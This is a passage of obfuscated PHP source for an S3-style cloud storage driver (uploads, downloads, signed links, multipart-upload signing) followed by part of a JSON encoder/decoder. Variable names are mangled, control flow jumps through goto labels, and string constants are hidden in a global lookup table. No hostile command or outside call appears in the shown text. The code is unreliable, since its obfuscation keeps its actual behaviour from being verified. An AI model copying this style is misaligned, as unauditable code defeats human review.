C”Üˆ…„Çç: $Eì¿½ºøâ = $this->client->putObject($Bçï¼–£‹, $this->bucket, $FØòôÂÃ†½, $d“åÊàÍ[185], array(), $Cî¨ÛéÄæ‚); if (!$Eì¿½ºøâ) { return !1; } if ($Dóçùç) { return !0; } goto fİ—åÈƒ å; AÁµ¤ø©”´: } public function fileSubstr($d×ï¬ÁÔÀ•, $Fãİ®êŞ”æ, $F‘‘œ“‹“¼) { $bëàî¦”Ì = $Fãİ®êŞ”æ + $F‘‘œ“‹“¼ - 1; return $this->client->getObject($this->bucket, $d×ï¬ÁÔÀ•, array($_SERVER[í™][198] => "\142\x79\x74\x65\x73\x3d{$Fãİ®êŞ”æ}\55{$bëàî¦”Ì}")); } public function upload($d»¡¹ªÅ, $dã„îß½¥œ, $e®Ç†›ÑŞ = false, $eÖ•ÃÓÊâ = REPEAT_REPLACE) { $aÄÅßÈ’ =& $_SERVER[í™]; $a‚ˆ¥—ŠÂá = array($aÄÅßÈ’[196] => @md5_file($dã„îß½¥œ)); $c´•™ºÎ‹ù = array($aÄÅßÈ’[199] => get_file_mime(get_path_ext($d»¡¹ªÅ))); if (IO::size($dã„îß½¥œ) <= 1024 * 1024 * 200) { $C™ù‰èŸù = $this->client->putObjectFile($dã„îß½¥œ, $this->bucket, $d»¡¹ªÅ, $aÄÅßÈ’[185], $a‚ˆ¥—ŠÂá, $c´•™ºÎ‹ù); return !empty($C™ù‰èŸù) ? $this->getPathOuter($d»¡¹ªÅ) : !1; } $fæ·£˜ ¤¶ = $this->client->multiUploadObject($dã„îß½¥œ, $this->bucket, trim($d»¡¹ªÅ, $aÄÅßÈ’[8]), $a‚ˆ¥—ŠÂá, $c´•™ºÎ‹ù); return $fæ·£˜ ¤¶ ? $this->getPathOuter($d»¡¹ªÅ) : !1; } public function download($eÑ¹ªµâø‰, $dª½Õ³Ü‘µ) { if (!@is_dir($this->pathFather($dª½Õ³Ü‘µ)) && !IO::mkdir($this->pathFather($dª½Õ³Ü‘µ))) { return !1; } $B¾Ğ¹ì†Ú = $this->client->getObject($this->bucket, $eÑ¹ªµâø‰, array(), $dª½Õ³Ü‘µ); return $B¾Ğ¹ì†Ú !== !1 ? $dª½Õ³Ü‘µ : !1; } public function link($EŞ–â†ÕŠ…, $A·Ê†îî© = array()) { $aÆÚ‡Õ¨µ“ =& $_SERVER[í™]; if ($this->signVer == $aÆÚ‡Õ¨µ“[200]) { return $this->client->getAuthenticatedURL($this->bucket, $EŞ–â†ÕŠ…, 3600 * 12, $A·Ê†îî©); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EŞ–â†ÕŠ…, $aÆÚ‡Õ¨µ“[8]), 3600 * 12, $this->region, array(), !0, $A·Ê†îî©); } public function fileOut($a®–Ş¨Õ×, $Fé•ò¸Šá = false, $d·òùœ°¤å = false, $bÁò¿…æ¹Æ = '') { goto AÖ¨÷‚ƒç…; AÖ¨÷‚ƒç…: $B¿ÚÄ¡Êã“ =& $_SERVER[í™]; if ($this->isFileOutServer()) { return $this->fileOutServer($a®–Ş¨Õ×, $Fé•ò¸Šá, $d·òùœ°¤å, $bÁò¿…æ¹Æ); } if (!$d·òùœ°¤å) { $d·òùœ°¤å = $this->pathThis($a®–Ş¨Õ×); } goto b¥¿åÑˆ’¤; Bì¢Ø‰…ùÖ: $bÏæóÒÏ…Ü = array($B¿ÚÄ¡Êã“[204] => $Fé•ò¸Šá . $B¿ÚÄ¡Êã“[205] . rawurlencode($d·òùœ°¤å), $B¿ÚÄ¡Êã“[206] => $f·ßè•Ë‰ª); $bõø˜Â¦¡¨ = $this->link($a®–Ş¨Õ×, $bÏæóÒÏ…Ü); $this->fileOutLink($bõø˜Â¦¡¨); goto AÌ÷´è¼„°; b¥¿åÑˆ’¤: $f·ßè•Ë‰ª = get_file_mime(get_path_ext($d·òùœ°¤å)); if ($f·ßè•Ë‰ª == $B¿ÚÄ¡Êã“[201]) { return parent::fileOut($a®–Ş¨Õ×, $Fé•ò¸Šá, $d·òùœ°¤å, $bÁò¿…æ¹Æ); } $Fé•ò¸Šá = $Fé•ò¸Šá ? $B¿ÚÄ¡Êã“[202] : $B¿ÚÄ¡Êã“[203]; goto Bì¢Ø‰…ùÖ; AÌ÷´è¼„°: } public function fileOutServer($d¥ŠßÊæÚ, $dßÚª½Ú‚ö = false, $A‰ôæ‡Ÿ¸’ = false, $Aã•ò—‹Ÿï = '') { parent::fileOut($d¥ŠßÊæÚ, $dßÚª½Ú‚ö, $A‰ôæ‡Ÿ¸’, $Aã•ò—‹Ÿï); } public function fileOutImageServer($B·ä±¼é, $eø¤¬ƒÔæ = 250) { parent::fileOutImage($B·ä±¼é, $eø¤¬ƒÔæ); } public function hashMd5($CòåÔñç, $EÛå“õŞ¢ó = '') { $A¥‘çÏ¦ƒÂ =& $_SERVER[í™]; $c‹ÊÜÆóè÷ = $this->objectMeta($CòåÔñç); if (!$c‹ÊÜÆóè÷) { return !1; } $EÛå“õŞ¢ó = $EÛå“õŞ¢ó ? $EÛå“õŞ¢ó : _get($c‹ÊÜÆóè÷, $A¥‘çÏ¦ƒÂ[207]); $EÛå“õŞ¢ó = $EÛå“õŞ¢ó ? $EÛå“õŞ¢ó : _get($c‹ÊÜÆóè÷, $A¥‘çÏ¦ƒÂ[197], $A¥‘çÏ¦ƒÂ[33]); return $EÛå“õŞ¢ó; } public function uploadFormData($eØ¦Ê¼ùø, $Cêóô—ÌÚ¬ = 3600) { $F¨„„•‹¥· =& $_SERVER[í™]; $Eˆ… Š¤± = $this->pathFather($eØ¦Ê¼ùø); $c‹¤ƒ²é×ô = $this->client->getHttpUploadPostParams($this->bucket, $Eˆ… Š¤±, $F¨„„•‹¥·[185], $Cêóô—ÌÚ¬); return array_merge((array) $c‹¤ƒ²é×ô, array($F¨„„•‹¥·[169] => $this->getHost())); } public function multiUploadFormData($dó‚Œ‘’, $a¿·›Ÿ§õ = 3600) { $Eù…‘¨ÊÕİ =& $_SERVER[í™]; $C±â»Å®Õ = gmdate($Eù…‘¨ÊÕİ[208]); $C—»‹İØ£Æ = array(); $aïªÇ‰Ğ» = $this->client->getUploadId($this->bucket, $dó‚Œ‘’, $C—»‹İØ£Æ); if (!$aïªÇ‰Ğ») { return !1; } return array($Eù…‘¨ÊÕİ[209] => $aïªÇ‰Ğ», $Eù…‘¨ÊÕİ[169] => $this->getHost() . $Eù…‘¨ÊÕİ[8] . $this->pathEncode($dó‚Œ‘’), $Eù…‘¨ÊÕİ[210] => $C±â»Å®Õ, $Eù…‘¨ÊÕİ[89] => $dó‚Œ‘’); } public function multiUploadAuthData($c­¤éáÆ, $bÏçÀ’›› = array()) { goto eï¤ğ½Õ¹í; D…É¬Ê¹ÌÙ: $aÚ…«çÕÎ = implode($e†¨‚ĞƒÊï[217], $E§¦è‚ÉŞ); $FÀñ²„ÓÖ† = base64_encode(hash_hmac($e†¨‚ĞƒÊï[218], $aÚ…«çÕÎ, $this->secret, !0)); $DÒï°„›óÃ = $e†¨‚ĞƒÊï[219] . $this->accessKey . $e†¨‚ĞƒÊï[4] . $FÀñ²„ÓÖ†; goto a®ŒŠë¾éŸ; eï¤ğ½Õ¹í: $e†¨‚ĞƒÊï =& $_SERVER[í™]; $CÅğ«ó®¤ = isset($bÏçÀ’››[$e†¨‚ĞƒÊï[210]]) ? $bÏçÀ’››[$e†¨‚ĞƒÊï[210]] : gmdate($e†¨‚ĞƒÊï[208]); $cñÈÒÖ±°Ê = isset($bÏçÀ’››[$e†¨‚ĞƒÊï[160]]) ? $bÏçÀ’››[$e†¨‚ĞƒÊï[160]] : $e†¨‚ĞƒÊï[33]; goto eœ®É«Õ; eÄ¹×òÆ‹: $E§¦è‚ÉŞ = array($e†¨‚ĞƒÊï[212], $e†¨‚ĞƒÊï[33], $e†¨‚ĞƒÊï[116], $e†¨‚ĞƒÊï[33], "\x78\x2d\x61\155\x7a\x2d\144\x61\x74\x65\72{$CÅğ«ó®¤}", $e†¨‚ĞƒÊï[8] . $this->bucket . $e†¨‚ĞƒÊï[8] . $this->pathEncode($Aİ‚œ«šÌØ) . $cñÈÒÖ±°Ê); if (strpos($cñÈÒÖ±°Ê, $e†¨‚ĞƒÊï[213]) === 0) { $E§¦è‚ÉŞ[0] = $e†¨‚ĞƒÊï[214]; } if (isset($bÏçÀ’››[$e†¨‚ĞƒÊï[215]]) && $bÏçÀ’››[$e†¨‚ĞƒÊï[215]] == $e†¨‚ĞƒÊï[216]) { $E§¦è‚ÉŞ[0] = $e†¨‚ĞƒÊï[216]; } goto D…É¬Ê¹ÌÙ; a®ŒŠë¾éŸ: if (strpos($cñÈÒÖ±°Ê, $e†¨‚ĞƒÊï[213]) === 0) { return array($e†¨‚ĞƒÊï[220] => $DÒï°„›óÃ, $e†¨‚ĞƒÊï[210] => $CÅğ«ó®¤); } return $DÒï°„›óÃ; goto b†”Ìí×Àˆ; eœ®É«Õ: $Aİ‚œ«šÌØ = $bÏçÀ’››[$e†¨‚ĞƒÊï[89]]; unset($bÏçÀ’››[$e†¨‚ĞƒÊï[89]]); if (isset($bÏçÀ’››[$e†¨‚ĞƒÊï[211]])) { $bÏçÀ’››[$e†¨‚ĞƒÊï[210]] = $CÅğ«ó®¤; return $this->listUploadParts($Aİ‚œ«šÌØ, $bÏçÀ’››); } goto eÄ¹×òÆ‹; b†”Ìí×Àˆ: } public function listUploadParts($F¯¤Œó’Úª, $a·ÛÊçùØ» = array()) { goto Cˆñæø­ñ; Cˆñæø­ñ: $fòİ¡ê¦Ú‹ =& $_SERVER[í™]; $aÃ‡ó›¼ß¥ = str_replace($fòİ¡ê¦Ú‹[221], $fòİ¡ê¦Ú‹[33], $a·ÛÊçùØ»[$fòİ¡ê¦Ú‹[160]]); $DØ—ÎÊõâŞ = $this->client->listParts($this->bucket, $F¯¤Œó’Úª, $aÃ‡ó›¼ß¥); goto A½â¯ÓÍˆ•; fÑÈ‚‘—é¢: $fÌ­Âì—™‰ = $this->multiUploadAuthData($F¯¤Œó’Úª, $a·ÛÊçùØ»); if (empty($fÌ­Âì—™‰)) { return !1; } return array($fòİ¡ê¦Ú‹[220] => $fÌ­Âì—™‰, $fòİ¡ê¦Ú‹[210] => $a·ÛÊçùØ»[$fòİ¡ê¦Ú‹[210]], $fòİ¡ê¦Ú‹[222] => $DØ—ÎÊõâŞ); goto AŒëî‰¾Ï˜; A½â¯ÓÍˆ•: if (!$DØ—ÎÊõâŞ) { return !1; } unset($a·ÛÊçùØ»[$fòİ¡ê¦Ú‹[211]], $a·ÛÊçùØ»[$fòİ¡ê¦Ú‹[215]]); $a·ÛÊçùØ»[$fòİ¡ê¦Ú‹[89]] = $F¯¤Œó’Úª; goto fÑÈ‚‘—é¢; AŒëî‰¾Ï˜: } public function getHost() { return parent::getHost() . $_SERVER[í™][8] . $this->bucket; } public function size($E£¾ÆöëÊ™) { $Eí˜Å„Í½æ = $this->objectMeta($E£¾ÆöëÊ™); return $Eí˜Å„Í½æ ? $Eí˜Å„Í½æ[$_SERVER[í™][77]] : 0; } public function info($cî‚•²©Çô) { if ($this->isFolder($cî‚•²©Çô)) { return $this->folderInfo($cî‚•²©Çô); } else { if ($this->isFile($cî‚•²©Çô)) { return $this->fileInfo($cî‚•²©Çô); } } return !1; } public function exist($cï¤­¿©‘Ù) { return $this->isFile($cï¤­¿©‘Ù) || $this->isFolder($cï¤­¿©‘Ù); } public function isFile($E¬½ºø•“¯) { return !$this->isFolder($E¬½ºø•“¯) && $this->objectMeta($E¬½ºø•“¯); } public function isFolder($CŸõâÍ‡â) { return $this->cacheMethod($_SERVER[í™][223], $CŸõâÍ‡â); } protected function objectMeta($e­ÒÍ‹Ö²) { return $this->cacheMethod($_SERVER[í™][224], $e­ÒÍ‹Ö²); } protected function _objectMeta($E¦°©ù¯ö) { $E”Ğ„‹Ç¢™ =& $_SERVER[í™]; $E¦°©ù¯ö = rtrim($E¦°©ù¯ö, $E”Ğ„‹Ç¢™[8]); try { $E×””ñÂ®š = $this->client->getObjectInfo($this->bucket, $E¦°©ù¯ö); if (!isset($E×””ñÂ®š[$E”Ğ„‹Ç¢™[207]]) && isset($E×””ñÂ®š[$E”Ğ„‹Ç¢™[225]])) { $E×””ñÂ®š[$E”Ğ„‹Ç¢™[207]] = $E×””ñÂ®š[$E”Ğ„‹Ç¢™[225]]; } } catch (Exception $d¯Ë°ïÛ£¼) { $E×””ñÂ®š = !1; } if (!$E×””ñÂ®š) { } return $E×””ñÂ®š; } protected function _isFolder($DĞ°êç’½Ï) { goto e¯êÃä‹‘ø; e¯êÃä‹‘ø: $d”ğ†›ñİ =& $_SERVER[í™]; $DĞ°êç’½Ï = rtrim($DĞ°êç’½Ï, $d”ğ†›ñİ[8]); if ($DĞ°êç’½Ï == $d”ğ†›ñİ[33] || $DĞ°êç’½Ï == $d”ğ†›ñİ[8]) { return !0; } goto DÈêêïÚ‘; DÈêêïÚ‘: $E°Í¦ñø¾ = $this->client->getBucket($this->bucket, $DĞ°êç’½Ï, null, 1); if (empty($E°Í¦ñø¾)) { return !1; } $E°Í¦ñø¾ = array_values($E°Í¦ñø¾); goto bŠØ‘•ºÂ‰; bŠØ‘•ºÂ‰: if (substr($E°Í¦ñø¾[0][$d”ğ†›ñİ[28]], -1) == $d”ğ†›ñİ[8]) { return !0; } if (get_path_this($E°Í¦ñø¾[0][$d”ğ†›ñİ[28]]) == get_path_this($DĞ°êç’½Ï)) { return !1; } return !0; goto BÛìÂ†æ¹µ; BÛìÂ†æ¹µ: } } define($_SERVER[í™][226], 1); goto Dëé¼×¨Á; C‰¡ÄĞº’œ: define($_SERVER[í™][1927], 32); class Services_JSON { function __construct($E°šÒÏÉ¶ = 0) { $this->use = $E°šÒÏÉ¶; } function utf162utf8($aÁ¢ŠïòµÊ) { $e¬¦»Åë¬ =& $_SERVER[í™]; if (function_exists($e¬¦»Åë¬[68])) { return mb_convert_encoding($aÁ¢ŠïòµÊ, $e¬¦»Åë¬[1576], $e¬¦»Åë¬[1928]); } $F“éÔ©òÈß = ord($aÁ¢ŠïòµÊ[0]) << 8 | ord($aÁ¢ŠïòµÊ[1]); switch (!0) { case (127 & $F“éÔ©òÈß) == $F“éÔ©òÈß: return chr(127 & $F“éÔ©òÈß); case (2047 & $F“éÔ©òÈß) == $F“éÔ©òÈß: return chr(192 | $F“éÔ©òÈß >> 6 & 31) . chr(128 | $F“éÔ©òÈß & 63); case (65535 & $F“éÔ©òÈß) == $F“éÔ©òÈß: return chr(224 | $F“éÔ©òÈß >> 12 & 15) . chr(128 | $F“éÔ©òÈß >> 6 & 63) . chr(128 | $F“éÔ©òÈß & 63); } return $e¬¦»Åë¬[33]; } function utf82utf16($d÷ª¬æÔˆõ) { $bâ¥Ùëˆ²Ù =& $_SERVER[í™]; if (function_exists($bâ¥Ùëˆ²Ù[68])) { return mb_convert_encoding($d÷ª¬æÔˆõ, $bâ¥Ùëˆ²Ù[1928], $bâ¥Ùëˆ²Ù[1576]); } switch (strlen($d÷ª¬æÔˆõ)) { case 1: return $d÷ª¬æÔˆõ; case 2: return chr(7 & ord($d÷ª¬æÔˆõ[0]) >> 2) . chr(192 & ord($d÷ª¬æÔˆõ[0]) << 6 | 63 & ord($d÷ª¬æÔˆõ[1])); case 3: return chr(240 & ord($d÷ª¬æÔˆõ[0]) << 4 | 15 & ord($d÷ª¬æÔˆõ[1]) >> 2) . chr(192 & ord($d÷ª¬æÔˆõ[1]) << 6 | 127 & ord($d÷ª¬æÔˆõ[2])); } return $bâ¥Ùëˆ²Ù[33]; } function encode($D¢†ÔçŞè) { $dÌ¥‹¼³ˆ =& $_SERVER[í™]; switch (gettype($D¢†ÔçŞè)) { case $dÌ¥‹¼³ˆ[1587]: return $D¢†ÔçŞè ? $dÌ¥‹¼³ˆ[1586] : $dÌ¥‹¼³ˆ[1588]; case $dÌ¥‹¼³ˆ[1929]: return $dÌ¥‹¼³ˆ[99]; case $dÌ¥‹¼³ˆ[303]: return (int) $D¢†ÔçŞè; case $dÌ¥‹¼³ˆ[278]: case $dÌ¥‹¼³ˆ[277]: return (double) $D¢†ÔçŞè; case $dÌ¥‹¼³ˆ[312]: $f®Ë’Õ§ÌË = $dÌ¥‹¼³ˆ[33]; $e£ìğéŸæ³ = strlen($D¢†ÔçŞè); for ($fäÀ¯Û£‹± = 0; $fäÀ¯Û£‹± < $e£ìğéŸæ³; ++$fäÀ¯Û£‹±) { $Dˆßµ¸‚õ = ord($D¢†ÔçŞè[$fäÀ¯Û£‹±]); switch (!0) { case $Dˆßµ¸‚õ == 8: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[1930]; break; case $Dˆßµ¸‚õ == 9: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[1563]; break; case $Dˆßµ¸‚õ == 10: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[1561]; break; case $Dˆßµ¸‚õ == 12: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[1931]; break; case $Dˆßµ¸‚õ == 13: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[1562]; break; case $Dˆßµ¸‚õ == 34: case $Dˆßµ¸‚õ == 47: case $Dˆßµ¸‚õ == 92: $f®Ë’Õ§ÌË .= $dÌ¥‹¼³ˆ[93] . $D¢†ÔçŞè[$fäÀ¯Û£‹±]; break; case $Dˆßµ¸‚õ >= 32 && $Dˆßµ¸‚õ <= 127: $f®Ë’Õ§ÌË .= $D¢†ÔçŞè[$fäÀ¯Û£‹±]; break; case ($Dˆßµ¸‚õ & 224) == 192: $B­ÈÑóË = pack($dÌ¥‹¼³ˆ[1932], $Dˆßµ¸‚õ, ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 1])); $fäÀ¯Û£‹± += 1; $cÙïÕóíë… = $this->utf82utf16($B­ÈÑóË); $f®Ë’Õ§ÌË .= sprintf($dÌ¥‹¼³ˆ[1933], bin2hex($cÙïÕóíë…)); break; case ($Dˆßµ¸‚õ & 240) == 224: $B­ÈÑóË = pack($dÌ¥‹¼³ˆ[1932], $Dˆßµ¸‚õ, ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 1]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 2])); $fäÀ¯Û£‹± += 2; $cÙïÕóíë… = $this->utf82utf16($B­ÈÑóË); $f®Ë’Õ§ÌË .= sprintf($dÌ¥‹¼³ˆ[1933], bin2hex($cÙïÕóíë…)); break; case ($Dˆßµ¸‚õ & 248) == 240: $B­ÈÑóË = pack($dÌ¥‹¼³ˆ[1932], $Dˆßµ¸‚õ, ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 1]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 2]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 3])); $fäÀ¯Û£‹± += 3; $cÙïÕóíë… = $this->utf82utf16($B­ÈÑóË); $f®Ë’Õ§ÌË .= sprintf($dÌ¥‹¼³ˆ[1933], bin2hex($cÙïÕóíë…)); break; case ($Dˆßµ¸‚õ & 252) == 248: $B­ÈÑóË = pack($dÌ¥‹¼³ˆ[1932], $Dˆßµ¸‚õ, ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 1]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 2]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 3]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 4])); $fäÀ¯Û£‹± += 4; $cÙïÕóíë… = $this->utf82utf16($B­ÈÑóË); $f®Ë’Õ§ÌË .= sprintf($dÌ¥‹¼³ˆ[1933], bin2hex($cÙïÕóíë…)); break; case ($Dˆßµ¸‚õ & 254) == 252: $B­ÈÑóË = pack($dÌ¥‹¼³ˆ[1932], $Dˆßµ¸‚õ, ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 1]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 2]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 3]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 4]), ord($D¢†ÔçŞè[$fäÀ¯Û£‹± + 5])); $fäÀ¯Û£‹± += 5; $cÙïÕóíë… = $this->utf82utf16($B­ÈÑóË); $f®Ë’Õ§ÌË .= sprintf($dÌ¥‹¼³ˆ[1933], bin2hex($cÙïÕóíë…)); break; } } return $dÌ¥‹¼³ˆ[113] . $f®Ë’Õ§ÌË . $dÌ¥‹¼³ˆ[113]; case $dÌ¥‹¼³ˆ[1934]: if (is_array($D¢†ÔçŞè) && count($D¢†ÔçŞè) && array_keys($D¢†ÔçŞè) !== range(0, sizeof($D¢†ÔçŞè) - 1)) { $C¦¯¶Ú¨ = array_map(array($this, $dÌ¥‹¼³ˆ[1935]), array_keys($D¢†ÔçŞè), array_values($D¢†ÔçŞè)); foreach ($C¦¯¶Ú¨ as $a’š‘ˆ”ª—) { if (Services_JSON::isError($a’š‘ˆ”ª—)) { return $a’š‘ˆ”ª—; } } return $dÌ¥‹¼³ˆ[1054] . join($dÌ¥‹¼³ˆ[47], $C¦¯¶Ú¨) . $dÌ¥‹¼³ˆ[315]; } $còã†Òá…Ü = array_map(array($this, $dÌ¥‹¼³ˆ[1936]), $D¢†ÔçŞè); foreach ($còã†Òá…Ü as $B‹Ã¬âØ¿–) { if (Services_JSON::isError($B‹Ã¬âØ¿–)) { return $B‹Ã¬âØ¿–; } } return $dÌ¥‹¼³ˆ[157] . join($dÌ¥‹¼³ˆ[47], $còã†Òá…Ü) . $dÌ¥‹¼³ˆ[478]; case $dÌ¥‹¼³ˆ[1937]: $fÓŠÈø‹–à = get_object_vars($D¢†ÔçŞè); $C¦¯¶Ú¨ = array_map(array($this, $dÌ¥‹¼³ˆ[1935]), array_keys($fÓŠÈø‹–à), array_values($fÓŠÈø‹–à)); foreach ($C¦¯¶Ú¨ as $a’š‘ˆ”ª—) { if (Services_JSON::isError($a’š‘ˆ”ª—)) { return $a’š‘ˆ”ª—; } } return $dÌ¥‹¼³ˆ[1054] . join($dÌ¥‹¼³ˆ[47], $C¦¯¶Ú¨) . $dÌ¥‹¼³ˆ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dÌ¥‹¼³ˆ[99] : new Services_JSON_Error(gettype($D¢†ÔçŞè) . $dÌ¥‹¼³ˆ[1938]); } } function name_value($Cò¹æê†¢ø, $A„Î•°æ“) { $DÉ˜¨õí÷İ = $this->encode($A„Î•°æ“); if (Services_JSON::isError($DÉ˜¨õí÷İ)) { return $DÉ˜¨õí÷İ; } return $this->encode(strval($Cò¹æê†¢ø)) . $_SERVER[í™][4] . $DÉ˜¨õí÷İ; } function reduce_string($aå×‘±ù“‡) { $eÕÑŒ´¨Üç =& $_SERVER[í™]; $aå×‘±ù“‡ = preg_replace(array($eÕÑŒ´¨Üç[1939], $eÕÑŒ´¨Üç[1940], $eÕÑŒ´¨Üç[1941]), $eÕÑŒ´¨Üç[33], $aå×‘±ù“‡); return trim($aå×‘±ù“‡); } function decode($aÎ‰¬•ö»Ô) { $E¡ÎíĞñ‡Ø =& $_SERVER[í™]; $aÎ‰¬•ö»Ô = $this->reduce_string($aÎ‰¬•ö»Ô); switch (strtolower($aÎ‰¬•ö»Ô)) { case $E¡ÎíĞñ‡Ø[1586]: return !0; case $E¡ÎíĞñ‡Ø[1588]: return !1; case $E¡ÎíĞñ‡Ø[99]: return null; default: $c’ÂòÄ¤“é = array(); if (is_numeric($aÎ‰¬•ö»Ô)) { return (double) $aÎ‰¬•ö»Ô == (int) $aÎ‰¬•ö»Ô ? (int) $aÎ‰¬•ö»Ô : (double) $aÎ‰¬•ö»Ô; } elseif (preg_match($E¡ÎíĞñ‡Ø[1942], $aÎ‰¬•ö»Ô, $c’ÂòÄ¤“é) && $c’ÂòÄ¤“é[1] == $c’ÂòÄ¤“é[2]) { $CÄ”ËÈ¤ÇÚ = substr($aÎ‰¬•ö»Ô, 0, 1); $aŠ´ˆÎ÷‡ = substr($aÎ‰¬•ö»Ô, 1, -1); $bèÎŒÅîîŠ = $E¡ÎíĞñ‡Ø[33]; $DÈÆØŒ¤–´ = strlen($aŠ´ˆÎ÷‡); for ($fÂÜÄ“É¸¡ = 0; $fÂÜÄ“É¸¡ < $DÈÆØŒ¤–´; ++$fÂÜÄ“É¸¡) { $A¶ìàã„÷Ò = substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 2); $bÌä°‚É¬Ó = ord($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡]); switch (!0) { case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1930]: $bèÎŒÅîîŠ .= chr(8); ++$fÂÜÄ“É¸¡; break; case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1563]: $bèÎŒÅîîŠ .= chr(9); ++$fÂÜÄ“É¸¡; break; case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1561]: $bèÎŒÅîîŠ .= chr(10); ++$fÂÜÄ“É¸¡; break; case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1931]: $bèÎŒÅîîŠ .= chr(12); ++$fÂÜÄ“É¸¡; break; case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1562]: $bèÎŒÅîîŠ .= chr(13); ++$fÂÜÄ“É¸¡; break; case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1342]: case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1943]: case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1556]: case $A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1558]: if ($CÄ”ËÈ¤ÇÚ == $E¡ÎíĞñ‡Ø[113] && $A¶ìàã„÷Ò != $E¡ÎíĞñ‡Ø[1943] || $CÄ”ËÈ¤ÇÚ == $E¡ÎíĞñ‡Ø[55] && $A¶ìàã„÷Ò != $E¡ÎíĞñ‡Ø[1342]) { $bèÎŒÅîîŠ .= $aŠ´ˆÎ÷‡[++$fÂÜÄ“É¸¡]; } break; case preg_match($E¡ÎíĞñ‡Ø[1944], substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 6)): $e·öÖ©ìØ† = chr(hexdec(substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡ + 2, 2))) . chr(hexdec(substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡ + 4, 2))); $bèÎŒÅîîŠ .= $this->utf162utf8($e·öÖ©ìØ†); $fÂÜÄ“É¸¡ += 5; break; case $bÌä°‚É¬Ó >= 32 && $bÌä°‚É¬Ó <= 127: $bèÎŒÅîîŠ .= $aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡]; break; case ($bÌä°‚É¬Ó & 224) == 192: $bèÎŒÅîîŠ .= substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 2); ++$fÂÜÄ“É¸¡; break; case ($bÌä°‚É¬Ó & 240) == 224: $bèÎŒÅîîŠ .= substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 3); $fÂÜÄ“É¸¡ += 2; break; case ($bÌä°‚É¬Ó & 248) == 240: $bèÎŒÅîîŠ .= substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 4); $fÂÜÄ“É¸¡ += 3; break; case ($bÌä°‚É¬Ó & 252) == 248: $bèÎŒÅîîŠ .= substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 5); $fÂÜÄ“É¸¡ += 4; break; case ($bÌä°‚É¬Ó & 254) == 252: $bèÎŒÅîîŠ .= substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 6); $fÂÜÄ“É¸¡ += 5; break; } } return $bèÎŒÅîîŠ; } elseif (preg_match($E¡ÎíĞñ‡Ø[1945], $aÎ‰¬•ö»Ô) || preg_match($E¡ÎíĞñ‡Ø[1946], $aÎ‰¬•ö»Ô)) { goto EîĞÈñ÷’ğ; Eò–Åè¦¸å: for ($fÂÜÄ“É¸¡ = 0; $fÂÜÄ“É¸¡ <= $DÈÆØŒ¤–´; ++$fÂÜÄ“É¸¡) { $e×¦˜õµ = end($Cé’ÎŞğÌ˜); $A¶ìàã„÷Ò = substr($aŠ´ˆÎ÷‡, $fÂÜÄ“É¸¡, 2); if ($fÂÜÄ“É¸¡ == $DÈÆØŒ¤–´ || $aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[47] && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] == SERVICES_JSON_SLICE) { $FÑíÑŸ¿½¯ = substr($aŠ´ˆÎ÷‡, $e×¦˜õµ[$E¡ÎíĞñ‡Ø[263]], $fÂÜÄ“É¸¡ - $e×¦˜õµ[$E¡ÎíĞñ‡Ø[263]]); array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_SLICE, $E¡ÎíĞñ‡Ø[263] => $fÂÜÄ“É¸¡ + 1, $E¡ÎíĞñ‡Ø[1948] => !1)); if (reset($Cé’ÎŞğÌ˜) == SERVICES_JSON_IN_ARR) { array_push($dÆøëïù”×, $this->decode($FÑíÑŸ¿½¯)); } elseif (reset($Cé’ÎŞğÌ˜) == SERVICES_JSON_IN_OBJ) { $d„œ†é÷Ç = array(); if (preg_match($E¡ÎíĞñ‡Ø[1949], $FÑíÑŸ¿½¯, $d„œ†é÷Ç)) { $e…ÒÖ„õë = $this->decode($d„œ†é÷Ç[1]); $aÌÃÄš•Ú« = $this->decode($d„œ†é÷Ç[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a‡ÔŒõéºÃ[$e…ÒÖ„õë] = $aÌÃÄš•Ú«; } else 